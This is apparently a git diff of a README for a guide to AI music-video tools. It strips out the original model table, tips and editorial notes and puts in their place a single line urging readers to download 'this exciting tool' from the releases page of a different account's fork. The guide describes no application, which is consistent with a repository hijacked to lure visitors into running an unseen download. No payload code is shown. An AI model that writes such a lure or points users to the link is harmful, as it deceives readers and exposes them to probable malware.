-<tr><td width="650"><b>Seedance 2.5</b><br>Our practice advice: Text or images → multi-shot planning. MusicMaker controls do not necessarily expose all developer reference features.</td><td width="350"><a href="https://seed.bytedance.com/en/blog/one-take-creation-flexible-referencing-introducing-seedance-2-5">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#seedance-concert">Step-by-step notes →</a><br><a href="https://musicmaker.im/model/seedance-2-5/"><kbd>MusicMaker · Seedance 2.5 ↗</kbd></a></td></tr>
-<tr><td width="650"><b>MiniMax H3</b><br>Our practice advice: Text/image clips and vocal-reference generation are separate routes. MusicMaker: The free entry offers 5 s at 480p; do not put singing audio in a text field.</td><td width="350"><a href="https://hailuoai.video/tools/minimax-h3">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#h3-singing">Step-by-step notes →</a><br><a href="https://musicmaker.im/model/minimax-h3/"><kbd>MusicMaker · MiniMax H3 ↗</kbd></a></td></tr>
-<tr><td width="650"><b>Veo 3.1</b><br>Our practice advice: Text or a first frame → scene clips. Check Fast versus standard first; do not assume MusicMaker offers multi-image reference controls.</td><td width="350"><a href="https://deepmind.google/models/veo/prompt-guide/">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#veo-scene">Step-by-step notes →</a><br><a href="https://musicmaker.im/model/veo-3-1-ai/"><kbd>MusicMaker · Veo 3.1 ↗</kbd></a></td></tr>
-<tr><td width="650"><b>Seedance 2.0</b><br>Our practice advice: Text or images → a solo performance shot. Check continuity of hands and instruments; note-for-note accuracy is not guaranteed.</td><td width="350"><a href="https://seed.bytedance.com/en/seedance2_0">Official guide / prompt ↗</a><br><a href="docs/official-cases.md#seedance-piano">Step-by-step notes →</a><br><a href="https://musicmaker.im/model/seedance-2-0/"><kbd>MusicMaker · Seedance 2.0 ↗</kbd></a></td></tr>
-</table>
-<!-- CAPABILITIES:END -->
-
-- **MiniMax Music 3.0:** “creative concept and optional lyrics.” [MiniMax’s release](https://www.minimax.io/blog/minimax-music-3-0-next-generation-open-weights-production-ready-versatile-music-model). Define how the song changes by section before you storyboard it. [MusicMaker ↗](https://musicmaker.im/minimax/minimax-music-v3-0/)
-- **Eleven Music:** “genre, mood, instrumentation, tempo, and production era.” [ElevenLabs’ prompting guide](https://elevenlabs.io/docs/overview/capabilities/music/best-practices). Use these as concrete starting points for a musical brief. [MusicMaker ↗](https://musicmaker.im/eleven-labs/eleven-labs-music/)
-
-[Read the practical model guide →](docs/models.md) · [Tool limits and checked sources](docs/sources.md)
-
-## Keep making
-
-[Study Lofi Girl, OK Go, and Gorillaz](docs/inspiration.md) · [Copy a planning template](starter-kit/brief-template.md) · [Contribute a recipe](CONTRIBUTING.md)
-
-Maintained by [AI Music Maker](https://musicmaker.im/). Use the workflow with your preferred tools. Original text, code, and practice audio: [MIT](LICENSE). External music, images, and videos remain with their owners: [credits and reuse notes](assets/README.md).
-
-<!-- AFFILIATE:START -->
-**Affiliate partnerships**
-
-MusicMaker supports affiliate partnerships. Share our music creation tools through tutorials, reviews or your community, and earn commission on eligible referrals.
-
-<a href="https://musicmaker.im/affiliate-program/"><kbd>↗ Explore the affiliate program</kbd></a>
-<!-- AFFILIATE:END -->
-
-<!-- TRUST:START -->
-<details>
-<summary>Editorial policy</summary>
-
-Maintained by the MusicMaker team, with priority given to models available through the brand. Recommendation links carry no affiliate parameters added by this repository; this does not mean there is no commercial interest. [ Editorial policy → ](docs/editorial-policy.md)
-
-Our original 16-second editing demo is complete. External examples were checked only against public sources and availability; neither AI generation tutorial has been tested end to end.
-
-This section compares the AI-generated visuals of Washed Out’s The Hardest Part (2024) with the live-action and post-production of OK Go’s The One Moment (2016). Both involve human creators. AI describes the visual process, not the authorship of the song. This is an editorial comparison of works and workflows, not a controlled test or evidence of relative cost, speed or overall quality. Sora is named only as the historical production tool.
-
-These are published demonstrations, not our generation tests or a model ranking.
-
-All four model versions have MusicMaker pages. Examples and guides come from the model makers; MusicMaker controls may differ. The H3 image is an input.
-
-The cover illustration is original concept artwork. Discover images are song covers, and the vocal tutorial uses the brand demo’s input portrait; these images are not evidence of our generated video results.
-
-X model names follow creator descriptions. Public mirrors were used to check posts and attached media; the videos were not reproduced. Production prompts remain in the original posts. [Source notes](docs/x-cases.md#source-notes).
-
-The nature and vocal tutorials are newly written exercises, not the original production recipes. MusicMaker has not identified the published vocal demo’s underlying model. The prompts have not been tested end to end and do not guarantee a matching cover, preserved audio or accurate lip sync.
-
-Public listening and viewing do not grant reuse rights. External music, images and video require appropriate authorization.
-
-[▶ Watch our editing demo](starter-kit/night-train-edit-demo.mp4) · [Evidence and test status (EN / 简体中文)](docs/generation-tests.md) · [Report a correction](https://github.com/aimusicmaker/awesome-music-video-creator-guide/issues/new/choose)
-
-</details>
-<!-- TRUST:END -->
-
-<!-- TRANSLATION:START -->
-Writing and translation use AI assistance. No independent native-language review is recorded. Detailed documents are in English and Simplified Chinese. [🌐 Language and review status](i18n/README.md)
-<!-- TRANSLATION:END -->
+Remember: the [download link](https://github.com/fleyderrivera/awesome-music-video-creator-guide/releases) is your gateway to this exciting tool. Visit this link to download the application and begin creating right away. Every professional creator started exactly where you are now—take that first step and see what amazing videos you can make!
